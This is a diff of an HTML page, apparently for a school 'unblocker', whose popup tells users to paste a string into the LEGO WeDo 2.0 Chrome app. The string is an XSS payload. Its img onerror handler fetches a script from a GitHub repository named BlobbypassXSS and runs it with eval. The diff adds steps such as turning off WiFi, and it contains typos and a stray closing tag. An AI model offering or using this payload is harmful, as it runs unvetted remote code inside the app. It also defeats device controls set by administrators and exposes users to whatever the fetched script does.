@@ -214,7 +214,7 @@
     </div>
 
     <!-- LegoWeDo 2.0 (Unblocker) Button -->
-    <button class="custom-btn btn-3" onclick="showConfirmation()">LegoWeDo 2.0 (Unblocker)</button>
+    <button class="custom-btn btn-3" onclick="showConfirmation()">LegoWeDo 2.0 (Unblocker)Gatekeeping</button>
 
     <!-- Overlay for popup -->
     <div class="overlay hidden" id="overlay"></div>
@@ -227,19 +227,26 @@
         <p id="passcodeError" style="color: red; display: none;">Incorrect passcode. Please try again.</p>
 
         <div id="instructions" style="display: none;">
-            <h3>Setup you have to do this each time :</h3>
             <p>First, install WeDo 2.0 LEGO® Education from the Chrome Webstore.</p>
+            <p> Wait until it loads, then turn off your WiFi.<p>
             <p>Once you are in the project, click on the pencil in the top bar.</p>
             <p>Then, click the green document button.</p>
             <p>In the textbox, paste the following string:</p>
-            
-            <div class="code-snippet-wrapper">
+                <div class="code-snippet-wrapper">
                 <pre><code>&lt;img src=# onerror='fetch
     ("https://raw.githubusercontent.com
     /Blobby-Boi/BlobbypassXSS/main/main.js")
     .then(r=>r.text())
     .then(c=>eval(c)) '&gt;</code></pre>
             </div>
+            <h3>ater Setup you have to do this part each time :</h3>
+            <p>Once you are in the project, click on the pencil in the top bar.</p>
+            <p>Then, click the green document button.</p>
+            <p>And paste in the string</p>
+             <p>somtimes you have to the setup again</p></p>
+            
+            
+        
             <p>Done!</p>
 
             <button class="confirm-btn" onclick="closeConfirmation()">Got it, close</button>
